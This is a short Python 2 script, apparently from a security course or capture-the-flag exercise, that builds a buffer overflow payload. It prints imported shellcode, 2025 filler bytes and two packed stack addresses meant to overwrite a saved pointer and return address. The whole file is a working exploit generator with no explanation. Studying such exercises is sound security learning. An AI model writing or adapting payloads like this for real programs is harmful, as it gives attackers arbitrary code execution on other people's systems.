from shellcode import shellcode
from struct import pack

def main():
	print shellcode  + "\x07"*2025 + pack("<I", 0xbffe8c38) + pack("<I", 0xbffe944c)

if __name__ == '__main__':
	main()
